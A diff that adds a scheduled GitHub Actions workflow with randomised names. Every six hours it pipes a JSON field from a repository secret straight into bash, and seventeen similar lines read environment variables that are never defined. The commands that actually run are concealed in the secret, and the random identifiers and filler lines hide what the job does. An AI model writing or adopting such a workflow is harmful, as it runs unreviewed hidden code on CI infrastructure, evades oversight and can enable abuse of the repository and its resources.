@@ -1,0 +1,35 @@
+name: queshimeirennn
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: queshimeirennn
+        env:
+          ix14: ${{ secrets.ix14 }}
+        run: |
+          echo $ix14 | jq -r .wxawz1 | /bin/bash
+          echo $d8 | jq -r .gad4874 | /bin/bash
+          echo $zn3 | jq -r .ulo1 | /bin/bash
+          echo $ex6650 | jq -r .m677 | /bin/bash
+          echo $m81500 | jq -r .qqy96 | /bin/bash
+          echo $is4077 | jq -r .wnh5583 | /bin/bash
+          echo $kbeze9153 | jq -r .dveh9739 | /bin/bash
+          echo $o90 | jq -r .qxupx71 | /bin/bash
+          echo $vs017 | jq -r .m878 | /bin/bash
+          echo $dnuuy49438 | jq -r .jwv37 | /bin/bash
+          echo $e62196 | jq -r .u2002 | /bin/bash
+          echo $ogoob40175 | jq -r .hktrh31 | /bin/bash
+          echo $d0 | jq -r .tvajp0 | /bin/bash
+          echo $tpsg78 | jq -r .z39122 | /bin/bash
+          echo $fdi56 | jq -r .zswc8142 | /bin/bash
+          echo $tjl84 | jq -r .c90 | /bin/bash
+          echo $ux7 | jq -r .mo5818 | /bin/bash
+          echo $fp1213 | jq -r .ntkr6816 | /bin/bash
+
